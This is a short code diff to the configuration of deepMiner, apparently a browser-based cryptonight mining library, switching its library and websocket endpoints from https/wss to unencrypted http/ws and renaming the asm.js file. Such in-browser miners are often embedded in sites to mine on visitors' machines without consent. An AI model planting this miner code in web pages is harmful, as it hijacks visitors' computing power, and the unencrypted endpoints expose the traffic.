@@ -1,8 +1,8 @@
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
-    LIB_URL: "https://%deepMiner_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%deepMiner_domain%/api"]],
-    ASMJS_NAME: "cryptonight-asmjs.min.js",
+    LIB_URL: "http://%deepMiner_domain%/lib/",
+    WEBSOCKET_SHARDS: [["ws://%deepMiner_domain%/api"]],
+    ASMJS_NAME: "cryptonight-asmjs.js",
     REQUIRES_AUTH: false
 };
 var Module = {
@@ -1134,7 +1134,7 @@ var ASM_CONSTS = [];
 STATIC_BASE = Runtime.GLOBAL_BASE;
 STATICTOP = STATIC_BASE + 11504;
 __ATINIT__.push();
-memoryInitializer = "cryptonight-asmjs.min.js.mem";
+memoryInitializer = "cryptonight-asmjs.js.mem";
 var tempDoublePtr = STATICTOP;
 STATICTOP += 16;
 var PROCINFO = {
